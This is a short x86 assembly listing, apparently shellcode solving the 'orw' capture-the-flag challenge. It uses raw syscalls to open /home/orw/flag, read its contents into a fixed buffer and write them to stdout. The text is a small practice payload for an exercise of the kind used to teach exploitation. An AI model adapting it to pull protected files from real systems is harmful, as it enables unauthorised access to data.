mov eax,5         ;implementing open syscall
xor ecx,ecx
xor edx,edx
push ecx
push 0x67616c66   ;/home/orw/flag
push 0x2f2f2f77
push 0x726f2f65
push 0x6d6f682f
mov ebx,esp       ;storing the path address in ebx
int 0x80

mov ebx,eax       ;implementing read syscall
mov eax,3
mov ecx, 0x0804a100 ;storing location for the read data
mov edx, 100
int 0x80

mov eax,4         ;implementing write syscall to stdout
mov ebx,1
mov ecx,0x804a100   
int 0x80

mov eax,1         ;implementing exit syscall
mov ebx,0
int 0x80

;references : https://stackoverflow.com/questions/3347747/reading-from-a-file-in-assembly/40490521#40490521









